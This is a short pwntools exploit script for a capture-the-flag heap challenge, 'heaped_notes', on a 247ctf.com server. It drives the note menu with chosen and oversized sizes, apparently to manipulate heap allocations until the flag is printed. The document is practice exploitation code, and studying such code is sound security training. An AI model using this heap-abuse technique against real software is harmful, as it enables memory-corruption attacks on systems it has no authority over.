
```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./heaped_notes')
context.terminal = ['tmux', 'splitw', '-h']
host = args.HOST or '0fe936e369345d81.247ctf.com'
port = int(args.PORT or 50125)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

def create_note(command, size, data ):
    io.recvuntil('Enter command:')
    io.sendline(command)
    io.recvuntil('Enter the size of your')
    io.sendline(size)
    io.recvuntil('Enter ')
    io.sendline(data)

def create_note_too_large(command, size):
    io.recvuntil('Enter command:')
    io.sendline(command)
    io.recvuntil('Enter the size of your')
    io.sendline(size)

io = start()
create_note('large', '8', 'C'*128)
create_note_too_large('large', '129')
create_note('medium', '8', 'B'*64)
create_note_too_large('medium', '129')
create_note('small', '8', 'A'*32)
io.recvuntil('Enter command:')
io.sendline('print')
io.sendline('flag')
io.interactive()
io.close()
```
